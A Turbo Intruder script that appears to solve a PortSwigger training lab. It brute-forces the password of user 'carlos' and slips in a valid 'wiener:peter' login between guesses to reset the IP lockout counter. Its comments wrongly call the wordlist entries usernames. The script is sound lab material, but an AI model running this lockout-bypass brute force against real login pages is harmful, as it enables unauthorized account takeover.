def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=200,
                           pipeline=False
                           )

    # Open the wordlist file for usernames
    with open('\portswigger.txt') as username_file:
        usernames = username_file.readlines()
        usernames = [username.strip() for username in usernames]

    total_requests = len(usernames) * 2  # Twice the number of usernames in the wordlist

    for i in range(total_requests):
        if i % 2 == 0:
            # Use 'wiener' username with constant password 'peter'
            engine.queue(target.req, ['wiener', 'peter'])
        else:
            # Alternate with 'carlos' username and the corresponding username from the wordlist
            current_username = usernames[i // 2 % len(usernames)]
            engine.queue(target.req, ['carlos', current_username])


def handleResponse(req, interesting):
    # Handle the response as per your requirements
    if req.status != 404:
        # Do something with the response, like adding to a table
        table.add(req)
